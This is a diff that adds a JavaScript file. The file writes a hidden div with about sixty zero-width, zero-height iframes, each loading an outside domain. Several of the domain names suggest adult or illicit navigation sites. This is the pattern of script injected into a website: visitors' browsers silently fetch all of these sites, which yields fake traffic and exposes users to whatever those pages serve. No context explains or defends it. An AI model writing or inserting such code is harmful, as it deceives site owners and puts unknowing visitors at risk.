@@ -1,0 +1,64 @@
+document.writeln("<div style=\'display:none\'>");
+
+document.writeln("<iframe src=\'http://www.hugedh.xyz/\' width=0 height=0></iframe>");
+document.writeln("<iframe src=\'http://www.huodh123.com/\' width=0 height=0></iframe>");
+document.writeln("<iframe src=\'http://www.selangdh.com/\' width=0 height=0></iframe>");
+document.writeln("<iframe src=\'http://younvdaohang.com/\' width=0 height=0></iframe>");
+document.writeln("<iframe src=\'http://www.jpmdh.xyz/\' width=0 height=0></iframe>");
+document.writeln("<iframe src=\'http://fbdh.me/\' width=0 height=0></iframe>");
+document.writeln("<iframe src=\'http://www.f2dh.top/\' width=0 height=0></iframe>");
+document.writeln("<iframe src=\'http://www.90hdh.info/\' width=0 height=0></iframe>");
+document.writeln("<iframe src=\'http://www.mglsdh.pw/\' width=0 height=0></iframe>");
+document.writeln("<iframe src=\'http://www.dgrdh.top/\' width=0 height=0></iframe>");
+document.writeln("<iframe src=\'http://www.mccdh3.pw/\' width=0 height=0></iframe>");
+document.writeln("<iframe src=\'http://www.13mzdh.info/\' width=0 height=0></iframe>");
+document.writeln("<iframe src=\'http://www.2000dh.top\' width=0 height=0></iframe>");
+document.writeln("<iframe src=\'http://www.gblw.biz/\' width=0 height=0></iframe>");
+document.writeln("<iframe src=\'http://luolidaohang.com/\' width=0 height=0></iframe>");
+document.writeln("<iframe src=\'http://xiaoxuesheng.pw/\' width=0 height=0></iframe>");
+document.writeln("<iframe src=\'http://mogutou.pw/\' width=0 height=0></iframe>");
+document.writeln("<iframe src=\'http://www.djjrdh.com\' width=0 height=0></iframe>");
+document.writeln("<iframe src=\'http://www.jsavdh.pw\' width=0 height=0></iframe>");
+document.writeln("<iframe src=\'http://www.8090dh.top/\' width=0 height=0></iframe>");
+document.writeln("<iframe src=\'http://www.cldh99.pw\' width=0 height=0></iframe>");
+document.writeln("<iframe src=\'http://www.avs66.pw/\' width=0 height=0></iframe>");
+document.writeln("<iframe src=\'http://www.grdh99.pw/\' width=0 height=0></iframe>");
+document.writeln("<iframe src=\'http://www.xbdh8.top/\' width=0 height=0></iframe>");
+
+document.writeln("<iframe src=\'http://www.73dh.pw/\' width=0 height=0></iframe>");
+document.writeln("<iframe src=\'http://www.70dh.pw/\' width=0 height=0></iframe>");
+document.writeln("<iframe src=\'http://www.71dh.pw/\' width=0 height=0></iframe>");
+document.writeln("<iframe src=\'http://www.72dh.pw/\' width=0 height=0></iframe>");
+document.writeln("<iframe src=\'http://www.74dh.pw/\' width=0 height=0></iframe>");
+document.writeln("<iframe src=\'http://www.75dh.pw/\' width=0 height=0></iframe>");
+document.writeln("<iframe src=\'http://www.76dh.pw/\' width=0 height=0></iframe>");
+document.writeln("<iframe src=\'http://www.77dh.pw/\' width=0 height=0></iframe>");
+document.writeln("<iframe src=\'http://www.79dh.pw/\' width=0 height=0></iframe>");
+document.writeln("<iframe src=\'http://www.78dh.pw/\' width=0 height=0></iframe>");
+document.writeln("<iframe src=\'http://www.60dh.pw/\' width=0 height=0></iframe>");
+document.writeln("<iframe src=\'http://www.61dh.pw/\' width=0 height=0></iframe>");
+document.writeln("<iframe src=\'http://www.62dh.pw/\' width=0 height=0></iframe>");
+document.writeln("<iframe src=\'http://www.63dh.pw\' width=0 height=0></iframe>");
+document.writeln("<iframe src=\'http://www.64dh.pw/\' width=0 height=0></iframe>");
+document.writeln("<iframe src=\'http://www.65dh.pw/\' width=0 height=0></iframe>");
+document.writeln("<iframe src=\'http://www.66dh.pw/\' width=0 height=0></iframe");
+document.writeln("<iframe src=\'http://www.67dh.pw\' width=0 height=0></iframe>");
+document.writeln("<iframe src=\'http://www.68dh.pw/\' width=0 height=0></iframe>");
+document.writeln("<iframe src=\'http://www.69dh.pw/\' width=0 height=0></iframe>");
+document.writeln("<iframe src=\'http://www.1dr2.top/\' width=0 height=0></iframe>");
+document.writeln("<iframe src=\'http://www.456p.top/\' width=0 height=0></iframe>");
+document.writeln("<iframe src=\'http://www.56sf.top/\' width=0 height=0></iframe>");
+document.writeln("<iframe src=\'http://www.kh32.top/\' width=0 height=0></iframe>");
+document.writeln("<iframe src=\'http://www.ngrr3.top/\' width=0 height=0></iframe>");
+document.writeln("<iframe src=\'http://www.sf142.top/\' width=0 height=0></iframe>");
+document.writeln("<iframe src=\'http://www.315073.top/\' width=0 height=0></iframe>");
+
+
+document.writeln("<iframe src=\'http://www.500daohang.com/\' width=0 height=0></iframe>");
+document.writeln("<iframe src=\'http://yasedh.xyz/\' width=0 height=0></iframe>");
+document.writeln("<iframe src=\'http://hongdoudh.xyz/\' width=0 height=0></iframe>");
+document.writeln("<iframe src=\'http://www.soav33.com/\' width=0 height=0></iframe>");
+document.writeln("<iframe src=\'http://yuepaodh.top/\' width=0 height=0></iframe>");
+document.writeln("<iframe src=\'http://www.16880.cf/\' width=0 height=0></iframe>");
+
+document.writeln("</div>");
